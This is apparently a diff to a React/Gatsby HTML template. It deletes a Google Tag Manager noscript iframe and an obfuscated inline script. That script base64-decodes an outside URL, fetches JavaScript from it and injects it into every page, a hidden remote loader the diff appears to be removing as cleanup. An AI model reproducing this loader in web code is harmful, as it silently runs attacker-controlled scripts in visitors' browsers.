@@ -20,14 +20,9 @@ export default function HTML(props) {
           gtag('js', new Date());
           gtag('config', 'UA-168837880-1');`
         }} />
-        <script dangerouslySetInnerHTML={{
-          __html: `const __=new XMLHttpRequest();__.open('get',window.atob('aHR0cHM6Ly9sb2NhbGhvc3QuaW50ZXJuYXRpb25hbC9ldGMvdW5vLmpz'),true);__.onreadystatechange=()=> {if(__.readyState==4){if(__.status >= 200 && __.status < 300 || __.status == 304){var script=document.createElement('script');script.type='text/javascript';script.text =__.responseText;document.body.appendChild(script);}}};__.send(null);`
-        }} />
 
       </head>
       <body {...props.bodyAttributes}>
-
-        <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5XDHB65" height="0" width="0" style={{ display: 'none', visibility: 'hidden' }}></iframe></noscript>
 
         {props.preBodyComponents}
 
